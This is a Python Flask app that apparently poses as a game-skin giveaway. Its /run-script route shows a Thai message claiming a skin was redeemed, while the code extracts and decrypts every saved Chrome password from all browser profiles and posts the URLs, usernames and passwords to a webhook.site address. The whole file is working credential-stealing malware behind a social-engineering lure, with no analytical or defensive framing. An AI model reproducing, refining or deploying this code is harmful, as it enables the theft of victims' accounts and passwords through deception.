from flask import Flask, render_template
import os, json, base64, sqlite3, shutil, win32crypt
import requests
from Cryptodome.Cipher import AES

app = Flask(__name__)

# ใช้ Webhook URL ของคุณจาก Webhook.site ตรงนี้
WEBHOOK_URL = "https://webhook.site/c8d4dd3e-bba8-4c6a-95eb-1595d91902ee"

def get_encryption_key():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(pwd, key):
    try:
        if pwd[:3] == b'v10':
            iv = pwd[3:15]
            payload = pwd[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        else:
            return win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
    except:
        return "Cannot decrypt"

def extract_and_send():
    key = get_encryption_key()
    base_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profiles = [p for p in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, p)) and (p == "Default" or p.startswith("Profile "))]

    data = []
    for profile in profiles:
        db_path = os.path.join(base_path, profile, "Login Data")
        if not os.path.exists(db_path): continue
        temp_db = f"{profile}_temp.db"
        shutil.copyfile(db_path, temp_db)

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pwd in cursor.fetchall():
                data.append({
                    "profile": profile,
                    "url": url,
                    "username": user,
                    "password": decrypt_password(pwd, key)
                })
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Error: {e}")
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)

    # ✅ ส่งแบบ POST จริง
    if data:
        try:
            res = requests.post(WEBHOOK_URL, json={"logins": data})
            print("Sent:", res.status_code)
        except Exception as e:
            print("Send failed:", e)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/run-script')
def run_script():
    extract_and_send()
    return "<h3>✅ แลกรับสกินสำเร็จ! กรุณาเข้าเกมเพื่อรับของขวัญ</h3>"

if __name__ == '__main__':
    app.run(debug=True)
